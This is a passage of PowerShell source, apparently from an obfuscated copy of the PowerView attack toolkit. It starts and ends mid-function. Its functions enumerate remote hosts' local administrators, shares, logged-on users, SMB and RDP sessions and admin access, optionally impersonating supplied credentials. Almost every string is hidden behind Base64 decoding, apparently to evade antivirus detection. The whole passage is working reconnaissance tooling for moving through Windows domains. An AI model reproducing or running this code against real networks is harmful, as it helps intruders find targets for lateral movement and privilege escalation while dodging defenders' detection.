                    Write-Verbose "[Get-NetLocalGroup] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                }
            }
            else {
                $ComputerProvider = [ADSI]"WinNT://$Computer,computer"
                $ComputerProvider.psbase.children | Where-Object { $_.psbase.schemaClassName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA=='))) } | ForEach-Object {
                    $LocalGroup = ([ADSI]$_)
                    $Group = New-Object PSObject
                    $Group | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $Computer
                    $Group | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ($LocalGroup.InvokeGet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA=')))))
                    $Group | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA'))) ((New-Object System.Security.Principal.SecurityIdentifier($LocalGroup.InvokeGet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA')))),0)).Value)
                    $Group | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBlAG4AdAA='))) ($LocalGroup.InvokeGet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA==')))))
                    $Group.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AYwBhAGwARwByAG8AdQBwAC4AVwBpAG4ATgBUAA=='))))
                    $Group
                }
            }
        }
    }
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}
function Get-NetLocalGroupMember {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName = 'Administrators',
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }
    PROCESS {
        ForEach ($Computer in $ComputerName) {
            if ($Method -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))) {
                $QueryLevel = 2
                $PtrInfo = [IntPtr]::Zero
                $EntriesRead = 0
                $TotalRead = 0
                $ResumeHandle = 0
                $Result = $Netapi32::NetLocalGroupGetMembers($Computer, $GroupName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)
                $Offset = $PtrInfo.ToInt64()
                $Members = @()
                if (($Result -eq 0) -and ($Offset -gt 0)) {
                    $Increment = $LOCALGROUP_MEMBERS_INFO_2::GetSize()
                    for ($i = 0; ($i -lt $EntriesRead); $i++) {
                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $LOCALGROUP_MEMBERS_INFO_2
                        $Offset = $NewIntPtr.ToInt64()
                        $Offset += $Increment
                        $SidString = ''
                        $Result2 = $Advapi32::ConvertSidToStringSid($Info.lgrmi2_sid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if ($Result2 -eq 0) {
                            Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                        }
                        else {
                            $Member = New-Object PSObject
                            $Member | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $Computer
                            $Member | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) $GroupName
                            $Member | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) $Info.lgrmi2_domainandname
                            $Member | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA'))) $SidString
                            $IsGroup = $($Info.lgrmi2_sidusage -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGQAVAB5AHAAZQBHAHIAbwB1AHAA'))))
                            $Member | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) $IsGroup
                            $Member.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AYwBhAGwARwByAG8AdQBwAE0AZQBtAGIAZQByAC4AQQBQAEkA'))))
                            $Members += $Member
                        }
                    }
                    $Null = $Netapi32::NetApiBufferFree($PtrInfo)
                    $MachineSid = $Members | Where-Object {$_.SID -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAqAC0ANQAwADAA'))) -or ($_.SID -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAqAC0ANQAwADEA'))))} | Select-Object -Expand SID
                    if ($MachineSid) {
                        $MachineSid = $MachineSid.Substring(0, $MachineSid.LastIndexOf('-'))
                        $Members | ForEach-Object {
                            if ($_.SID -match $MachineSid) {
                                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) $False
                            }
                            else {
                                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) $True
                            }
                        }
                    }
                    else {
                        $Members | ForEach-Object {
                            if ($_.SID -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAA==')))) {
                                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) $False
                            }
                            else {
                                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
                            }
                        }
                    }
                    $Members
                }
                else {
                    Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                }
            }
            else {
                try {
                    $GroupProvider = [ADSI]"WinNT://$Computer/$GroupName,group"
                    $GroupProvider.psbase.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIAcwA=')))) | ForEach-Object {
                        $Member = New-Object PSObject
                        $Member | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $Computer
                        $Member | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) $GroupName
                        $LocalUser = ([ADSI]$_)
                        $AdsPath = $LocalUser.InvokeGet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAHMAUABhAHQAaAA=')))).Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4ATgBUADoALwAvAA=='))), '')
                        $IsGroup = ($LocalUser.SchemaClassName -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA=='))))
                        if(([regex]::Matches($AdsPath, '/')).count -eq 1) {
                            $MemberIsDomain = $True
                            $Name = $AdsPath.Replace('/', '\')
                        }
                        else {
                            $MemberIsDomain = $False
                            $Name = $AdsPath.Substring($AdsPath.IndexOf('/')+1).Replace('/', '\')
                        }
                        $Member | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAbwB1AG4AdABOAGEAbQBlAA=='))) $Name
                        $Member | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA'))) ((New-Object System.Security.Principal.SecurityIdentifier($LocalUser.InvokeGet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA')))),0)).Value)
                        $Member | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) $IsGroup
                        $Member | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) $MemberIsDomain
                        $Member
                    }
                }
                catch {
                    Write-Verbose "[Get-NetLocalGroupMember] Error for $Computer : $_"
                }
            }
        }
    }
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}
function Get-NetShare {
    [OutputType('PowerView.ShareInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }
    PROCESS {
        ForEach ($Computer in $ComputerName) {
            $QueryLevel = 1
            $PtrInfo = [IntPtr]::Zero
            $EntriesRead = 0
            $TotalRead = 0
            $ResumeHandle = 0
            $Result = $Netapi32::NetShareEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)
            $Offset = $PtrInfo.ToInt64()
            if (($Result -eq 0) -and ($Offset -gt 0)) {
                $Increment = $SHARE_INFO_1::GetSize()
                for ($i = 0; ($i -lt $EntriesRead); $i++) {
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $SHARE_INFO_1
                    $Share = $Info | Select-Object *
                    $Share | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $Computer
                    $Share.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBTAGgAYQByAGUASQBuAGYAbwA='))))
                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $Share
                }
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-NetShare] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
    }
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}
function Get-NetLoggedon {
    [OutputType('PowerView.LoggedOnUserInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }
    PROCESS {
        ForEach ($Computer in $ComputerName) {
            $QueryLevel = 1
            $PtrInfo = [IntPtr]::Zero
            $EntriesRead = 0
            $TotalRead = 0
            $ResumeHandle = 0
            $Result = $Netapi32::NetWkstaUserEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)
            $Offset = $PtrInfo.ToInt64()
            if (($Result -eq 0) -and ($Offset -gt 0)) {
                $Increment = $WKSTA_USER_INFO_1::GetSize()
                for ($i = 0; ($i -lt $EntriesRead); $i++) {
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $WKSTA_USER_INFO_1
                    $LoggedOn = $Info | Select-Object *
                    $LoggedOn | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $Computer
                    $LoggedOn.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AZwBnAGUAZABPAG4AVQBzAGUAcgBJAG4AZgBvAA=='))))
                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $LoggedOn
                }
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-NetLoggedon] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
    }
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}
function Get-NetSession {
    [OutputType('PowerView.SessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }
    PROCESS {
        ForEach ($Computer in $ComputerName) {
            $QueryLevel = 10
            $PtrInfo = [IntPtr]::Zero
            $EntriesRead = 0
            $TotalRead = 0
            $ResumeHandle = 0
            $Result = $Netapi32::NetSessionEnum($Computer, '', $UserName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)
            $Offset = $PtrInfo.ToInt64()
            if (($Result -eq 0) -and ($Offset -gt 0)) {
                $Increment = $SESSION_INFO_10::GetSize()
                for ($i = 0; ($i -lt $EntriesRead); $i++) {
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $SESSION_INFO_10
                    $Session = $Info | Select-Object *
                    $Session | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $Computer
                    $Session.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBTAGUAcwBzAGkAbwBuAEkAbgBmAG8A'))))
                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $Session
                }
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-NetSession] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
    }
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}
function Get-RegLoggedOn {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.RegLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost'
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }
    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBzAA=='))), "$ComputerName")
                $Reg.GetSubKeyNames() | Where-Object { $_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAC0AWwAwAC0AOQBdACsALQBbADAALQA5AF0AKwAtAFsAMAAtADkAXQArAC0AWwAwAC0AOQBdACsAJAA='))) } | ForEach-Object {
                    $UserName = ConvertFrom-SID -ObjectSID $_ -OutputType $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AUwBpAG0AcABsAGUA')))
                    if ($UserName) {
                        $UserName, $UserDomain = $UserName.Split('@')
                    }
                    else {
                        $UserName = $_
                        $UserDomain = $Null
                    }
                    $RegLoggedOnUser = New-Object PSObject
                    $RegLoggedOnUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) "$ComputerName"
                    $RegLoggedOnUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) $UserDomain
                    $RegLoggedOnUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) $UserName
                    $RegLoggedOnUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) $_
                    $RegLoggedOnUser.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBSAGUAZwBMAG8AZwBnAGUAZABPAG4AVQBzAGUAcgA='))))
                    $RegLoggedOnUser
                }
            }
            catch {
                Write-Verbose "[Get-RegLoggedOn] Error opening remote registry on '$ComputerName' : $_"
            }
        }
    }
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}
function Get-NetRDPSession {
    [OutputType('PowerView.RDPSessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }
    PROCESS {
        ForEach ($Computer in $ComputerName) {
            $Handle = $Wtsapi32::WTSOpenServerEx($Computer)
            if ($Handle -ne 0) {
                $ppSessionInfo = [IntPtr]::Zero
                $pCount = 0
                $Result = $Wtsapi32::WTSEnumerateSessionsEx($Handle, [ref]1, 0, [ref]$ppSessionInfo, [ref]$pCount);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                $Offset = $ppSessionInfo.ToInt64()
                if (($Result -ne 0) -and ($Offset -gt 0)) {
                    $Increment = $WTS_SESSION_INFO_1::GetSize()
                    for ($i = 0; ($i -lt $pCount); $i++) {
                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $WTS_SESSION_INFO_1
                        $RDPSession = New-Object PSObject
                        if ($Info.pHostName) {
                            $RDPSession | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $Info.pHostName
                        }
                        else {
                            $RDPSession | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $Computer
                        }
                        $RDPSession | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBOAGEAbQBlAA=='))) $Info.pSessionName
                        if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {
                            $RDPSession | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) "$($Info.pUserName)"
                        }
                        else {
                            $RDPSession | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) "$($Info.pDomainName)\$($Info.pUserName)"
                        }
                        $RDPSession | Add-Member Noteproperty 'ID' $Info.SessionID
                        $RDPSession | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdABlAA=='))) $Info.State
                        $ppBuffer = [IntPtr]::Zero
                        $pBytesReturned = 0
                        $Result2 = $Wtsapi32::WTSQuerySessionInformation($Handle, $Info.SessionID, 14, [ref]$ppBuffer, [ref]$pBytesReturned);$LastError2 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if ($Result2 -eq 0) {
                            Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError2).Message)"
                        }
                        else {
                            $Offset2 = $ppBuffer.ToInt64()
                            $NewIntPtr2 = New-Object System.Intptr -ArgumentList $Offset2
                            $Info2 = $NewIntPtr2 -as $WTS_CLIENT_ADDRESS
                            $SourceIP = $Info2.Address
                            if ($SourceIP[2] -ne 0) {
                                $SourceIP = [String]$SourceIP[2]+'.'+[String]$SourceIP[3]+'.'+[String]$SourceIP[4]+'.'+[String]$SourceIP[5]
                            }
                            else {
                                $SourceIP = $Null
                            }
                            $RDPSession | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUASQBQAA=='))) $SourceIP
                            $RDPSession.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBSAEQAUABTAGUAcwBzAGkAbwBuAEkAbgBmAG8A'))))
                            $RDPSession
                            $Null = $Wtsapi32::WTSFreeMemory($ppBuffer)
                            $Offset += $Increment
                        }
                    }
                    $Null = $Wtsapi32::WTSFreeMemoryEx(2, $ppSessionInfo, $pCount)
                }
                else {
                    Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                }
                $Null = $Wtsapi32::WTSCloseServer($Handle)
            }
            else {
                Write-Verbose "[Get-NetRDPSession] Error opening the Remote Desktop Session Host (RD Session Host) server for: $ComputerName"
            }
        }
    }
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}
function Test-AdminAccess {
    [OutputType('PowerView.AdminAccess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }
    PROCESS {
        ForEach ($Computer in $ComputerName) {
            $Handle = $Advapi32::OpenSCManagerW("\\$Computer", $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBzAEEAYwB0AGkAdgBlAA=='))), 0xF003F);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            $IsAdmin = New-Object PSObject
            $IsAdmin | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $Computer
            if ($Handle -ne 0) {
                $Null = $Advapi32::CloseServiceHandle($Handle)
                $IsAdmin | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEEAZABtAGkAbgA='))) $True
            }
            else {
                Write-Verbose "[Test-AdminAccess] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                $IsAdmin | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEEAZABtAGkAbgA='))) $False
            }
            $IsAdmin.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAGQAbQBpAG4AQQBjAGMAZQBzAHMA'))))
            $IsAdmin
        }
    }
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}
function Get-NetComputerSiteName {
    [OutputType('PowerView.ComputerSite')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }
    PROCESS {
        ForEach ($Computer in $ComputerName) {
            if ($Computer -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoAD8AOgBbADAALQA5AF0AewAxACwAMwB9AFwALgApAHsAMwB9AFsAMAAtADkAXQB7ADEALAAzAH0AJAA=')))) {
                $IPAddress = $Computer
                $Computer = [System.Net.Dns]::GetHostByAddress($Computer) | Select-Object -ExpandProperty HostName
            }
            else {
                $IPAddress = @(Resolve-IPAddress -ComputerName $Computer)[0].IPAddress
            }
            $PtrInfo = [IntPtr]::Zero
            $Result = $Netapi32::DsGetSiteName($Computer, [ref]$PtrInfo)
            $ComputerSite = New-Object PSObject
            $ComputerSite | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $Computer
            $ComputerSite | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEEAZABkAHIAZQBzAHMA'))) $IPAddress
            if ($Result -eq 0) {
                $Sitename = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($PtrInfo)
                $ComputerSite | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA=='))) $Sitename
            }
            else {
                Write-Verbose "[Get-NetComputerSiteName] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                $ComputerSite | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA=='))) ''
            }
            $ComputerSite.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBDAG8AbQBwAHUAdABlAHIAUwBpAHQAZQA='))))
            $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            $ComputerSite
        }
    }
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}
function Get-WMIRegProxy {
    [OutputType('PowerView.ProxySettings')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                $WmiArguments = @{
                    'List' = $True
                    'Class' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA=')))
                    'Namespace' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA')))
                    'Computername' = $Computer
                    'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcAA=')))
                }
